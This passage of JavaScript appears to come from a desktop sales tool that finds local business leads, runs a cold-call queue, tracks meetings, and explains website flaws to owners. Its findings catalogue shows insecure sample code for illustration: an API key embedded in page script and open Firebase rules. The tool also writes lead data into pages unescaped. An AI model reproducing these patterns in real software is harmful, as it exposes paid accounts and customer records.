const PROVIDER = "serpapi";   // switch to "mock" to demo without spending searches
/* --- dev error reporter: surfaces the real location of any thrown error --- */
window.addEventListener('error', e=>{
  const box=document.createElement('div');
  box.style.cssText='position:fixed;left:16px;right:16px;bottom:16px;z-index:9999;background:#141416;color:#fff;'+
    'font:12px/1.6 ui-monospace,monospace;padding:14px 16px;border-radius:9px;white-space:pre-wrap;box-shadow:0 8px 30px rgba(0,0,0,.4)';
  box.textContent='ERROR: '+(e.message||'')+'\nat '+(e.filename||'?')+':'+(e.lineno||'?')+':'+(e.colno||'?')+
    (e.error&&e.error.stack?'\n\n'+e.error.stack.split('\n').slice(0,4).join('\n'):'')+
    '\n\n(click to dismiss)';
  box.onclick=()=>box.remove();
  document.body.appendChild(box);
});
window.addEventListener('unhandledrejection',e=>{
  console.error('Unhandled promise rejection:', e.reason);
});

const $=id=>document.getElementById(id);

/* ---- animated number: ticks up rather than snapping ---- */
const reduce = window.matchMedia && matchMedia('(prefers-reduced-motion: reduce)').matches;
function setNum(el, val, prefix){
  if(!el) return;
  const from = parseInt(String(el.textContent).replace(/[^0-9]/g,''),10)||0;
  const to = Number(val)||0;
  const fmt = n => (prefix||'')+n.toLocaleString();
  if(reduce || from===to){ el.textContent=fmt(to); return; }
  el.classList.remove('tick'); void el.offsetWidth; el.classList.add('tick');
  const steps=Math.min(22, Math.max(6, Math.abs(to-from)));
  let i=0;
  clearInterval(el._n);
  el._n=setInterval(()=>{
    i++;
    const t=i/steps, e=1-Math.pow(1-t,3);
    el.textContent=fmt(Math.round(from+(to-from)*e));
    if(i>=steps){ clearInterval(el._n); el.textContent=fmt(to); }
  }, 26);
}

/* ---- activity feed ---- */
const ACT_ICONS={search:'i-scraper',mail:'i-outreach',call:'i-calls',meet:'i-meet',won:'i-closed',proj:'i-launch',check:'i-scanner'};
function ago(t){
  const s=Math.floor((Date.now()-t)/1000);
  if(s<60) return 'just now';
  if(s<3600) return Math.floor(s/60)+'m ago';
  if(s<86400) return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}
function renderActivity(){
  const f=$('actFeed'); if(!f) return;
  const a=db.activity.slice(0,6);
  f.innerHTML = a.length
    ? a.map(x=>`<div class="act-i"><span class="ai3"><svg viewBox="0 0 24 24"><use href="#${ACT_ICONS[x.icon]||'i-home'}"/></svg></span>
        <span>${x.text}</span><span class="when">${ago(x.at)}</span></div>`).join('')
    : `<div class="act-empty">Nothing yet. Run a search in the Lead Scraper and this fills up as you work.</div>`;
}
setInterval(()=>{ if(!$('v-home').hidden) renderActivity(); }, 30000);


/* =========================================================================
   db.js  —  stand-in for the SQLite layer.
   Same call shapes the real module exposes, so the swap is mechanical.
   ========================================================================= */
/* =========================================================================
   db — a synchronous mirror of the real SQLite database in the main process.
   Reads come from the cache so all the render code stays synchronous;
   writes go over IPC and then re-sync. Same call shapes as before.
   ========================================================================= */
const API = window.artura;
const STATE = { leads: [], projects: [], activity: [], profile: {} };

async function unwrap(promise, label){
  const r = await promise;
  if (r && r.ok) return r.data;
  const err = new Error((r && r.message) || 'failed');
  err.code = (r && r.code) || 'UNKNOWN';
  console.error(label || 'ipc', err.code, err.message);
  throw err;
}
async function syncState(){
  const [leads, projects, activity] = await Promise.all([
    unwrap(API.leads.all()), unwrap(API.projects.all()), unwrap(API.activity.list(20))
  ]);
  STATE.leads = leads.map(l => ({
    ...l,
    quality: { bucket: l.site_bucket || (l.website ? null : 'none'), score: l.site_score, failed: [] },
    emailed: !!l.emailed_at,
    enriched: !!l.enriched_at,
    checked: !!l.checked_at
  }));
  STATE.projects = projects;
  STATE.activity = activity.map(a => ({ ...a, at: new Date(a.created_at + 'Z').getTime() }));
}

const db = {
  all: () => STATE.leads,
  countLeads: () => STATE.leads.length,
  byId: pid => STATE.leads.find(l => l.place_id === pid),
  organizer: () => STATE.leads.filter(l => l.in_organizer),
  hasLead: pid => STATE.leads.some(l => l.place_id === pid),
  get activity(){ return STATE.activity; },
  counts(){
    const o = this.organizer();
    const c = { new:0, booked:0, maybe:0, no:0, blacklist:0, voicemail:0, noanswer:0 };
    o.forEach(l => c[l.call_status] = (c[l.call_status]||0) + 1);
    c.total = o.length;
    c.meetings = o.filter(l => l.meeting_at).length;
    c.held = o.filter(l => ['won','lost'].includes(l.meeting_outcome)).length;
    c.won  = o.filter(l => l.meeting_outcome === 'won').length;
    c.value = o.reduce((n,l) => n + (l.meeting_outcome === 'won' ? Number(l.deal_value)||0 : 0), 0);
    return c;
  },
  async addToOrganizer(ids){ const n = await unwrap(API.leads.addToOrganizer(ids)); await syncState(); return n; },
  async logCall(pid, status, extra){ await unwrap(API.leads.logCall(pid, status, extra)); await syncState(); },
  async update(pid, fields){ await unwrap(API.leads.update(pid, fields)); await syncState(); },
  async logEvent(icon, text){ await unwrap(API.activity.log(icon, text)); await syncState(); },
  reset(){}
};

let searchesLeft = null;

async function runSearch({ businessType, zip, fields, want }){
  const r = await unwrap(API.leads.search({ businessType, zip, fields, want, provider: PROVIDER }));
  await syncState();
  const meter = await API.meter();
  if (meter && meter.ok && meter.data) { searchesLeft = meter.data.left; const m = $('meterN'); if (m) m.textContent = searchesLeft; }
  const fresh = STATE.leads.slice(0, r.inserted);
  return { ...r, leads: fresh };
}

/* =========================================================================
   Selection → Organizer
   ========================================================================= */
function wireSelection(){
  const picks=[...document.querySelectorAll('.pick')], bar=$('selbar'), all=$('pickAll');
  const sync=()=>{
    const n=picks.filter(p=>p.checked).length;
    bar.hidden=n===0; $('selN').textContent=n;
    if(all) all.checked = n===picks.length && n>0;
  };
  picks.forEach(p=>p.addEventListener('change',sync));
  if(all) all.addEventListener('change',()=>{ picks.forEach(p=>p.checked=all.checked); sync(); });
  const send=$('sendOrg');
  send.addEventListener('click', async () => {
    const ids=picks.filter(p=>p.checked).map(p=>p.value);
    if(!ids.length) return;
    send.disabled=true;
    const n=await db.addToOrganizer(ids);
    send.disabled=false;
    picks.forEach(p=>{p.checked=false}); sync();
    send.textContent=`Added ${n} to the Organizer`;
    setTimeout(()=>{ if(send.isConnected) send.textContent='Send to Call Organizer'; },1800);
    refreshCounts();
  });
}

/* =========================================================================
   Call Organizer
   ========================================================================= */
const STATUS = {
  new:        {label:'Not called',     cls:'newq'},
  booked:     {label:'Meeting booked', cls:'interested'},
  maybe:      {label:'Maybe later',    cls:'maybe'},
  noanswer:   {label:'No answer',      cls:'newq'},
  voicemail:  {label:'Voicemail',      cls:'newq'},
  no:         {label:'Not interested', cls:'no'},
  blacklist:  {label:'Blacklist',      cls:'blacklist'}
};
const today = () => new Date().toISOString().slice(0,10);
let orgTab='queue', orgFilter='all', queueIdx=0;

/* Queue order: callbacks due first, then never-called, then retries.
   Interested / not interested / blacklist drop out of the queue. */
function queueList(){
  const t=today();
  const inPlay = db.organizer().filter(l=>!['booked','no','blacklist'].includes(l.call_status));
  const due  = inPlay.filter(l=>l.callback_on && l.callback_on<=t)
                     .sort((a,b)=>a.callback_on.localeCompare(b.callback_on));
  const fresh= inPlay.filter(l=>l.call_status==='new');
  const retry= inPlay.filter(l=>['noanswer','voicemail'].includes(l.call_status) && !(l.callback_on&&l.callback_on<=t));
  const later= inPlay.filter(l=>l.call_status==='maybe' && !(l.callback_on&&l.callback_on<=t));
  return [...due,...fresh,...retry,...later];
}

function pitchAngles(L){
  const a=[];
  const q=L.quality||{};
  if(q.bucket==='none') a.push('No website at all — nothing to find them by online');
  else if(q.bucket==='dead') a.push('Their web address is listed but doesn\'t load');
  else if(q.failed && q.failed.length) q.failed.forEach(f=>a.push(f));
  if(!a.length) a.push('Site checks out — lead with speed, price, or a redesign');
  if(L.rating && Number(L.rating)>=4.4) a.push(`Well reviewed (${L.rating} from ${L.reviews}) — busy, so a better site pays for itself`);
  return a;
}

function renderStats(){
  const c=db.counts();
  const cells=[
    ['total','Total',c.total,''],
    ['booked','Meetings booked',c.booked,'interested'],
    ['maybe','Maybe later',c.maybe,'maybe'],
    ['blacklist','Blacklist',c.blacklist,'blacklist']
  ];
  $('statbar').innerHTML = cells.map(([k,l,v,cls])=>
    `<div class="stat"><div class="sv">${v}</div><div class="sl">${cls?`<span class="sq ${cls}"></span>`:''}${l}</div></div>`
  ).join('') + `<label class="stat monotog" style="display:flex;align-items:center;justify-content:center;min-width:auto;padding:11px 15px">
      <input type="checkbox" class="rowcb" id="monoTog" ${document.body.classList.contains('mono')?'checked':''}> Monochrome
    </label>`;
  $('monoTog').addEventListener('change',e=>{
    document.body.classList.toggle('mono', e.target.checked);
    renderOrganizer();
  });
}

function renderQueue(){
  const q=queueList(), box=$('org-queue');
  if(!q.length){
    box.innerHTML=`<div class="empty">
      <span class="bigico"><svg viewBox="0 0 24 24"><use href="#i-calls"/></svg></span>
      <h3>Queue is clear</h3>
      <p>Everyone in the Organizer has been worked through, or is scheduled for a later date. Add more from the Lead Scraper, or check the All leads tab.</p></div>`;
    return;
  }
  if(queueIdx>=q.length) queueIdx=0;
  const L=q[queueIdx];
  const dueNote = L.callback_on && L.callback_on<=today() ? ` · callback was due ${L.callback_on}` : '';

  box.innerHTML=`
  <div class="qcard">
    <div class="qhead">
      <div class="qpos">${queueIdx+1} of ${q.length} in queue${dueNote}</div>
      <div class="qname">${L.name}</div>
      <div class="qmeta">${L.address}, ${L.city} ${L.zip}${L.attempts?` · ${L.attempts} previous ${L.attempts===1?'attempt':'attempts'}`:''}</div>
      <div class="qphone">${L.phone}</div>
    </div>
    <div class="qbody">
      <div class="angles">
        <div class="ah">What you found</div>
        <ul>${pitchAngles(L).map(a=>`<li>${a}</li>`).join('')}</ul>
      </div>
      <div class="script">
        <div class="ah">The only goal of this call is to book a 15-minute meeting</div>
        <p><b>Open</b> — "Hi, is the owner around? My name's ___, I build websites for ${(L.name.split(' ')[1]||'local')} companies here in ${L.city}."</p>
        <p><b>Reason</b> — "I was looking at your site and noticed ${(pitchAngles(L)[0]||'a few things').toLowerCase()}."</p>
        <p><b>The ask</b> — "I'm not going to pitch you on the phone. Do you have fifteen minutes Thursday or Friday? I'll share my screen and show you exactly what I'd change. If you don't like it, you've lost fifteen minutes."</p>
        <p class="obj"><b>"Just email me"</b> — "Happy to. It lands better if I can show you rather than describe it — fifteen minutes, and I'll send the notes after either way. Thursday or Friday?"</p>
      </div>
      <textarea class="qnotes" id="qNotes" placeholder="Notes from this call…">${L.notes||''}</textarea>
    </div>
    <div class="qfoot">
      <div class="qfl">How did it go?</div>
      <div class="obtns">
        <button class="ob" data-out="booked"><span class="sq interested"></span> Meeting booked</button>
        <button class="ob" data-out="maybe"><span class="sq maybe"></span> Maybe later</button>
        <button class="ob" data-out="no"><span class="sq no"></span> Not interested</button>
        <button class="ob" data-out="blacklist"><span class="sq blacklist"></span> Blacklist</button>
        <button class="ob" data-out="noanswer">No answer</button>
        <button class="ob" data-out="voicemail">Voicemail</button>
        <button class="ob wide" id="qSkip">Skip for now →</button>
      </div>
      <div class="cbwrap" id="cbwrap">
        <span id="cbLabel">Call back on</span>
        <input type="date" id="cbDate" value="${L.callback_on||''}">
        <span id="valWrap" hidden>Meeting on
          <input type="date" id="mDate" value="${(L.meeting_at||'').slice(0,10)}">
          <input type="time" id="mTime" value="${(L.meeting_at||'').slice(11,16)||'10:00'}">
        </span>
        <button class="btn pri" id="cbSave">Save and next</button>
      </div>
    </div>
  </div>`;

  let pending=null;
  box.querySelectorAll('.ob[data-out]').forEach(b=>b.addEventListener('click',()=>{
    pending=b.dataset.out;
    const needsDate = pending==='maybe'||pending==='noanswer'||pending==='voicemail';
    const needsVal  = pending==='booked';
    if(needsDate||needsVal){
      $('cbwrap').classList.add('show');
      $('cbLabel').hidden=!needsDate; $('cbDate').hidden=!needsDate;
      $('valWrap').hidden=!needsVal;
      if(needsVal && !$('mDate').value){
        const d=new Date(); d.setDate(d.getDate()+3);
        $('mDate').value=d.toISOString().slice(0,10);
      }
      if(needsDate && !$('cbDate').value){
        const d=new Date(); d.setDate(d.getDate()+(pending==='maybe'?30:2));
        $('cbDate').value=d.toISOString().slice(0,10);
      }
      return;
    }
    commit(pending);
  }));
  $('qSkip').addEventListener('click',()=>{ queueIdx++; renderOrganizer(); });
  $('cbSave').addEventListener('click',()=>commit(pending));

  async function commit(status){
    const lbl={booked:'Booked a meeting with',maybe:'Marked maybe —',no:'Not interested —',blacklist:'Blacklisted',noanswer:'No answer at',voicemail:'Left voicemail for'}[status];
    await db.logEvent(status==='booked'?'meet':'call',`${lbl} <b>${L.name}</b>`);
    await db.logCall(L.place_id, status, {
      notes: $('qNotes').value,
      callback_on: (status==='maybe'||status==='noanswer'||status==='voicemail') ? ($('cbDate').value||null) : null,
      meeting_at: status==='booked' ? (($('mDate').value||'')+'T'+($('mTime').value||'10:00')) : undefined
    });
    renderOrganizer();
  }
}

function renderList(){
  const t=today();
  let rows=db.organizer();
  if(orgFilter!=='all') rows=rows.filter(l=>l.call_status===orgFilter);
  rows=[...rows].sort((a,b)=>{
    const ad=a.callback_on&&a.callback_on<=t?0:1, bd=b.callback_on&&b.callback_on<=t?0:1;
    return ad-bd || a.name.localeCompare(b.name);
  });

  const c=db.counts();
  const chips=[['all','Everyone',c.total],['new','Not called',c.new],['booked','Meeting booked',c.booked],
               ['maybe','Maybe later',c.maybe],['noanswer','No answer',c.noanswer],['voicemail','Voicemail',c.voicemail],
               ['no','Not interested',c.no],['blacklist','Blacklist',c.blacklist]];

  $('org-list').innerHTML=`
    <div class="chips">${chips.map(([k,l,n])=>
      `<button class="chip ${orgFilter===k?'on':''}" data-filter="${k}">${k!=='all'?`<span class="sq ${STATUS[k].cls}"></span>`:''}${l} ${n||0}</button>`).join('')}</div>
    <div class="tblwrap"><div class="tblscroll"><table>
      <thead><tr><th>Status</th><th>Business</th><th>Phone</th><th>Site</th><th>Attempts</th><th>Last called</th><th>Callback</th><th>Value</th><th>Notes</th></tr></thead>
      <tbody>${rows.map(L=>{
        const s=STATUS[L.call_status];
        const overdue=L.callback_on&&L.callback_on<=t;
        return `<tr>
          <td><span class="sq ${s.cls}"></span><span class="stag">${s.label}</span></td>
          <td class="name">${L.name}</td>
          <td>${L.phone}</td>
          <td>${qualityCell(L)}</td>
          <td>${L.attempts}</td>
          <td>${L.last_called||'—'}</td>
          <td>${L.callback_on?`<span class="due ${overdue?'past':''}">${L.callback_on}</span>`:'—'}</td>
          <td>${L.deal_value?'$'+Number(L.deal_value).toLocaleString():'—'}</td>
          <td style="white-space:normal;max-width:260px;color:var(--ink-3)">${L.notes||''}</td>
        </tr>`}).join('')}</tbody>
    </table></div>
    <div class="tblfoot">${rows.length} shown · callbacks that are due sort to the top</div></div>`;

  $('org-list').querySelectorAll('.chip').forEach(b=>b.addEventListener('click',()=>{
    orgFilter=b.dataset.filter; renderList();
  }));
}

function renderOrganizer(){
  const any=db.organizer().length>0;
  $('org-empty').hidden=any; $('org-main').hidden=!any;
  if(!any) return;
  renderStats();
  $('org-queue').hidden = orgTab!=='queue';
  $('org-list').hidden  = orgTab!=='list';
  if(orgTab==='queue') renderQueue(); else renderList();
  refreshCounts();
}
document.querySelectorAll('.tab').forEach(t=>t.addEventListener('click',()=>{
  document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on'));
  t.classList.add('on'); orgTab=t.dataset.tab; queueIdx=0; renderOrganizer();
}));


/* =========================================================================
   Meetings — the second half of the two-call model.
   A booked meeting has its own lifecycle: confirm it, prep it, hold it,
   then win or lose it. No-shows are the thing that kills this model, so
   confirming is a tracked step rather than something you remember.
   ========================================================================= */
function fmtDate(iso){
  const d=new Date(iso+(iso.length<=10?'T00:00':''));
  return d.toLocaleDateString(undefined,{weekday:'short',month:'short',day:'numeric'});
}
function fmtTime(iso){
  const t=iso.slice(11,16); if(!t) return '';
  const [h,m]=t.split(':').map(Number);
  const ap=h>=12?'pm':'am', hh=h%12||12;
  return `${hh}:${String(m).padStart(2,'0')}${ap}`;
}
function daysAway(iso){
  const a=new Date(iso.slice(0,10)+'T00:00'), b=new Date(today()+'T00:00');
  return Math.round((a-b)/86400000);
}

/* Prefilled Google Calendar event. Google doesn't allow creating a Meet
   link from a plain URL — the member clicks "Add Google Meet" once inside
   the event, which takes one click and no sign-in plumbing on our side. */
function calendarUrl(L){
  const start=(L.meeting_at||'').replace(/[-:]/g,'')+'00';
  const end=new Date(new Date(L.meeting_at).getTime()+30*60000)
    .toISOString().slice(0,19).replace(/[-:]/g,'');
  const details=[
    `Website review with ${L.name}`,'',
    'What I found on their current site:',
    ...pitchAngles(L).map(a=>'- '+a),'',
    `Phone: ${L.phone}`,
    L.website?`Site: ${L.website}`:'No website'
  ].join('\n');
  return 'https://calendar.google.com/calendar/render?action=TEMPLATE'
    +'&text='+encodeURIComponent(`Website review — ${L.name}`)
    +'&dates='+start+'/'+end
    +'&details='+encodeURIComponent(details)
    +'&location='+encodeURIComponent('Google Meet');
}

function confirmMessage(L){
  return `Hi — confirming our quick call ${fmtDate(L.meeting_at)} at ${fmtTime(L.meeting_at)}. `
    +`I'll share my screen and walk you through what I'd change on your site. Should take about fifteen minutes. `
    +`Here's the link: ${L.meet_link||'[paste your Google Meet link]'}`;
}

/* Electron does not implement window.prompt(), so this small modal replaces it.
   Resolves with the entered string, or null if cancelled. */
function askText({ title, message='', value='', placeholder='', okText='Save', type='text' }){
  return new Promise(resolve => {
    const wrap = document.createElement('div');
    wrap.style.cssText = 'position:fixed;inset:0;z-index:6000;background:rgba(20,20,22,.35);display:flex;align-items:center;justify-content:center;padding:24px';
    wrap.innerHTML = `<div style="background:var(--bg-panel);border:1px solid var(--line);border-radius:14px;padding:24px 26px;max-width:420px;width:100%;box-shadow:0 24px 60px rgba(20,20,22,.18)">
      <div style="font-family:var(--display);font-size:18px;font-weight:600;letter-spacing:-.02em;margin-bottom:${message?'6px':'14px'}">${title}</div>
      ${message?`<div style="font-size:13px;color:var(--ink-2);line-height:1.5;margin-bottom:14px">${message}</div>`:''}
      <input class="txt" id="_askInput" type="${type}" placeholder="${placeholder}" value="${String(value).replace(/"/g,'&quot;')}" style="width:100%">
      <div style="display:flex;gap:9px;justify-content:flex-end;margin-top:18px">
        <button class="btn" id="_askCancel">Cancel</button>
        <button class="btn pri" id="_askOk">${okText}</button>
      </div></div>`;
    document.body.appendChild(wrap);
    const input = wrap.querySelector('#_askInput');
    const done = val => { wrap.remove(); resolve(val); };
    wrap.querySelector('#_askCancel').onclick = () => done(null);
    wrap.querySelector('#_askOk').onclick = () => done(input.value);
    input.addEventListener('keydown', e => {
      if (e.key === 'Enter') { e.preventDefault(); done(input.value); }
      if (e.key === 'Escape') done(null);
    });
    wrap.addEventListener('mousedown', e => { if (e.target === wrap) done(null); });
    setTimeout(() => { input.focus(); if (input.select) input.select(); }, 30);
  });
}

function renderMeetings(){
  const all=db.organizer().filter(l=>l.meeting_at);
  $('mt-empty').hidden = all.length>0;
  $('mt-main').hidden  = all.length===0;
  if(!all.length) return;

  const c=db.counts();
  const dialled=db.organizer().filter(l=>l.attempts>0).length;
  const held=c.held, won=c.won;
  const pct=(a,b)=> b? Math.round(a/b*100)+'%' : '—';
  $('mt-funnel').innerHTML=`
    <div class="fu"><div class="fv">${dialled}</div><div class="fl">Called</div><div class="fr">businesses dialled</div></div>
    <div class="fu"><div class="fv">${all.length}</div><div class="fl">Booked</div><div class="fr">${pct(all.length,dialled)} of calls booked</div></div>
    <div class="fu"><div class="fv">${held}</div><div class="fl">Held</div><div class="fr">${pct(held,all.length)} showed up</div></div>
    <div class="fu"><div class="fv">${won}</div><div class="fl">Won</div><div class="fr">${pct(won,held)} of meetings closed</div></div>`;

  const upcoming=all.filter(l=>!l.meeting_outcome).sort((a,b)=>a.meeting_at.localeCompare(b.meeting_at));
  const done=all.filter(l=>l.meeting_outcome).sort((a,b)=>b.meeting_at.localeCompare(a.meeting_at));

  const card=(L,isDone)=>{
    const away=daysAway(L.meeting_at);
    const when = away===0?'Today':away===1?'Tomorrow':away<0?`${Math.abs(away)}d ago`:`in ${away}d`;
    let badge='';
    if(!isDone){
      if(away<0) badge=`<span class="badge warn">Needs an outcome</span>`;
      else if(away<=1 && !L.confirmed) badge=`<span class="badge warn">Confirm this</span>`;
      else if(L.confirmed) badge=`<span class="badge">Confirmed</span>`;
    } else {
      badge=`<span class="badge">${{won:'Won',lost:'Lost',noshow:'No-show'}[L.meeting_outcome]}${L.deal_value?' · $'+Number(L.deal_value).toLocaleString():''}</span>`;
    }
    return `<div class="mcard ${away===0&&!isDone?'today':''}" data-id="${L.place_id}">
      <div class="mhead">
        <div class="mwhen">
          <div class="md">${fmtDate(L.meeting_at)}</div>
          <div class="mt">${fmtTime(L.meeting_at)} · ${when}</div>
          ${badge}
        </div>
        <div class="mbiz">
          <div class="mn">${L.name}</div>
          <div class="mm">${L.phone} · ${L.city}${L.website?' · '+L.website:' · no website'}</div>
        </div>
        <div class="mact">
          <button class="btn" data-act="toggle">${isDone?'View notes':'Open prep sheet'}</button>
          ${isDone?'':`<a class="btn pri" style="text-align:center;text-decoration:none" href="${calendarUrl(L)}" target="_blank" rel="noopener">Add to Google Calendar</a>`}
        </div>
      </div>
      <div class="mbody">
        <div class="ah" style="font-family:var(--mono);font-size:9.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-3);margin-bottom:11px">What to cover on the screen share</div>
        <div class="prep">
          ${pitchAngles(L).map(a=>`<div class="pi">${a}</div>`).join('')}
          <div class="pi">Show their site next to a competitor's, then show what you'd build</div>
          <div class="pi">Give the price on this call — don't say you'll email it over</div>
        </div>
        ${L.notes?`<div class="pi" style="font-size:13px;color:var(--ink-3)">Call notes: ${L.notes}</div>`:''}
        ${isDone?'':`
        <div class="linkrow">
          <input placeholder="Paste your Google Meet link here" value="${L.meet_link||''}" data-act="link">
          <button class="btn" data-act="copy">Copy confirmation message</button>
        </div>
        <div style="margin-top:14px;display:flex;gap:9px;flex-wrap:wrap;align-items:center">
          <label class="cb" style="padding:0"><input type="checkbox" data-act="confirm" ${L.confirmed?'checked':''}> Confirmation sent</label>
          <span style="margin-left:auto;font-family:var(--mono);font-size:9.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-3)">How did it go?</span>
          <button class="ob" data-out="won"><span class="sq interested"></span> Won</button>
          <button class="ob" data-out="lost"><span class="sq no"></span> Lost</button>
          <button class="ob" data-out="noshow">No-show</button>
          <button class="ob" data-out="reschedule">Reschedule</button>
        </div>`}
      </div>
    </div>`;
  };

  $('mt-list').innerHTML =
    (upcoming.length?`<div class="h-sec" style="margin-top:0">Upcoming</div>`+upcoming.map(L=>card(L,false)).join(''):'')
  + (done.length?`<div class="h-sec">Finished</div>`+done.map(L=>card(L,true)).join(''):'');

  $('mt-list').querySelectorAll('.mcard').forEach(card=>{
    const L=db.byId(card.dataset.id);
    card.querySelector('[data-act="toggle"]').addEventListener('click',()=>{
      card.querySelector('.mbody').classList.toggle('open');
    });
    const link=card.querySelector('[data-act="link"]');
    if(link) link.addEventListener('change',()=>{ db.update(L.place_id,{ meet_link:link.value }); });
    const cp=card.querySelector('[data-act="copy"]');
    if(cp) cp.addEventListener('click',()=>{
      navigator.clipboard?.writeText(confirmMessage(L));
      cp.textContent='Copied';
      setTimeout(()=>{ if(cp.isConnected) cp.textContent='Copy confirmation message'; },1600);
    });
    const cf=card.querySelector('[data-act="confirm"]');
    if(cf) cf.addEventListener('change', async () => { await db.update(L.place_id,{ confirmed:cf.checked?1:0 }); renderMeetings(); });
    card.querySelectorAll('.ob[data-out]').forEach(b=>b.addEventListener('click', async () => {
      const o=b.dataset.out;
      if(o==='won'){
        const v=await askText({title:'Mark as won',message:`What did the deal with ${L.name} come to? (dollars)`,value:L.deal_value||'',placeholder:'e.g. 1200',okText:'Save as won',type:'number'});
        if(v===null) return;
        await db.update(L.place_id,{ meeting_outcome:'won', deal_value:Number(v)||0 });
        await db.logEvent('won',`Won <b>${L.name}</b> at $${(Number(v)||0).toLocaleString()}`);
      } else if(o==='lost'){
        await db.update(L.place_id,{ meeting_outcome:'lost' });
      } else if(o==='noshow'){
        const d=new Date(); d.setDate(d.getDate()+1);
        await db.update(L.place_id,{ meeting_outcome:null, meeting_at:null, confirmed:0,
          call_status:'noanswer', callback_on:d.toISOString().slice(0,10),
          notes:(L.notes?L.notes+' · ':'')+'No-showed the meeting' });
      } else if(o==='reschedule'){
        const nd=await askText({title:'Reschedule meeting',message:`Pick a new date for ${L.name}.`,value:(L.meeting_at||'').slice(0,10),okText:'Next',type:'date'});
        if(!nd) return;
        const nt=await askText({title:'Reschedule meeting',message:'And the new time.',value:(L.meeting_at||'').slice(11,16)||'10:00',okText:'Save',type:'time'});
        if(!nt) return;
        await db.update(L.place_id,{ meeting_at:nd+'T'+nt, confirmed:0 });
      }
      renderMeetings(); refreshCounts();
    }));
  });
}


/* =========================================================================
   sitecheck.js — the findings catalogue.
   Each entry knows how to detect itself from a fetched page, and knows how
   to explain itself to somebody who has never heard the word "server".
   `detect` runs in the Electron main process against the real response.
   ========================================================================= */
const FINDINGS = {

/* ---------------------------------------------------------------------
   Code-level findings. Each one is something you can only know by
   reading the source — which is exactly why it lands on a call.
   `code` is what the member points at on the screen share.
   --------------------------------------------------------------------- */

apikey: { sev:'critical', weight:34,
  title:'A paid account password is sitting in the page code',
  code:`&lt;script&gt;
  const OPENAI_KEY = "sk-proj-8Kd93mQx7pL2vN4rT6yH1wZ...";
  const client = new OpenAI({ apiKey: OPENAI_KEY,
                              dangerouslyAllowBrowser: true });
&lt;/script&gt;`,
  means:`Every website is made of two halves. The half that runs on the visitor's own computer, and the half that runs on a server the public never sees. Anything in the first half is readable by anyone — press Ctrl+U on any website and you're looking at it right now.

A key is a long password that unlocks a paid account. This site has one written into the half that everybody can read. Whoever built it needed the site to talk to a paid service, and put the key in the only place they knew how, rather than on a server.

Note the phrase <b>dangerouslyAllowBrowser: true</b> in that code. The company that makes this service put the word "dangerous" into the setting, because it refuses to run in a browser unless you explicitly override the warning. Somebody clicked past that.`,
  costs:`Two ways, and the first is fast.

Automated programs scan every website on the internet looking for keys in exactly this spot. Not people — programs, running constantly. A key posted publicly is typically found in minutes to hours, not weeks. Once found, it gets used to run someone else's workload on this account, and the bill goes to the owner. There is no spending cap by default. People have woken up to five-figure charges.

The second is slower and worse. If that key touches a database rather than just an AI service, it isn't a billing problem, it's every customer record the business holds.`,
  say:`I want to start with the serious one. There's a password to a paid account written into your website's code, where anyone visiting can read it. You can see it yourself — right click your page, hit View Source, and search for "sk-".

The reason that's urgent is there are programs that do nothing but crawl the internet looking for that exact thing, and they find them in hours. When they do, they use your account and you get the bill. There's no cap on it.

I'm not telling you this to scare you into hiring me. Whether you work with me or not, that key needs deleting and regenerating today.`,
  fix:`The fix is that the key moves to a small piece of code on the server, and the page asks the server instead of holding the key itself. It's a standard thing — usually an hour or two of work, and it's included in anything I build.` },

deadform: { sev:'critical', weight:26,
  title:'The contact form goes nowhere',
  code:`&lt;form onsubmit="return false;"&gt;
  &lt;input name="email" placeholder="Your email"&gt;
  &lt;textarea name="message"&gt;&lt;/textarea&gt;
  &lt;button type="submit"&gt;Send&lt;/button&gt;
&lt;/form&gt;
&lt;!-- no action, no handler, nothing listening --&gt;`,
  means:`A form needs somewhere to send what people type. That destination is normally written into the code as an address, or a piece of code that catches it and emails it on.

This form has neither. When somebody fills it in and presses Send, the browser clears the boxes and the page looks like it worked. Nothing is sent, nothing is stored, and nobody is notified.

This is one of the most common things I find on sites built quickly, because a form looks finished long before it is finished. The visible part takes five minutes. The part that actually delivers the message is the real work, and it's easy to skip.`,
  costs:`Every person who has used this form thought they contacted the business. None of them did. They're not going to call twice — they'll assume they were ignored and go to whoever answers.

This is the most expensive problem on most sites I look at, because the people it loses were the ones already sold. They'd made the decision. They typed their details in.

It's also invisible from the owner's side. There's no error and no bounce. It just looks like a quiet month.`,
  say:`Can I ask when you last got an enquiry through your website's contact form?

The reason I ask is I looked at how it's built, and it isn't connected to anything. When somebody fills it in and hits Send, the boxes clear and it looks like it went through — but it doesn't go anywhere. It's not sending to a broken address, there's no address at all.

So anyone who's used that form over the last however-long thinks they reached out to you and never heard back.

Easy to check — send yourself one right now while we're on the call.`,
  fix:`I'd wire it to a real form service so submissions land in your inbox within seconds, with a copy stored so nothing is ever lost, and an automatic reply so the customer knows it arrived.` },

opendb: { sev:'critical', weight:30,
  title:'The database is open to the public',
  code:`const firebaseConfig = {
  apiKey: "AIzaSyDx8Kq...",
  projectId: "acme-roofing-42",
  databaseURL: "https://acme-roofing-42.firebaseio.com"
};
// Firestore rules: allow read, write: if true;`,
  means:`When a site stores anything — enquiries, bookings, customer details — it goes into a database. The database has rules deciding who is allowed to read and write.

The rules on this one are set to allow anyone. That's the default setting when you're building and testing, because it makes everything work immediately. It's meant to be tightened before the site goes live, and often isn't.

The connection details are also written into the public half of the code, which is normal and fine for this kind of database — but only if the rules are locked. Here they aren't. The address is public and the door is unlocked.`,
  costs:`Anyone who can read the page can read the entire database. Every name, phone number, email and message ever submitted.

They can also write to it and delete it, so there's a real chance of losing the lot.

If the business is in a state with a data-breach notification law, this stops being an IT problem and becomes a legal one — they'd be required to tell every affected customer.`,
  say:`This one I want to walk through carefully because it's the most serious thing on the site.

Your site stores enquiries in a database. Databases have a rules setting for who's allowed to look in it, and yours is currently set to allow anybody. That's the setting people use while they're building, and it's supposed to get locked down before the site goes live.

What that means in practice is that anyone who knows where to look can read every enquiry you've ever received, with the names, numbers and emails attached.

The fix isn't a big job — it's a rules change, an afternoon. But it needs doing regardless of who does it.`,
  fix:`I'd lock the rules so the database only accepts what your forms send and nothing can be read back out, then check what's currently exposed so you know where you stand.` },

sourcemaps: { sev:'fix', weight:14,
  title:'The original source code is published alongside the site',
  code:`// bottom of app.min.js
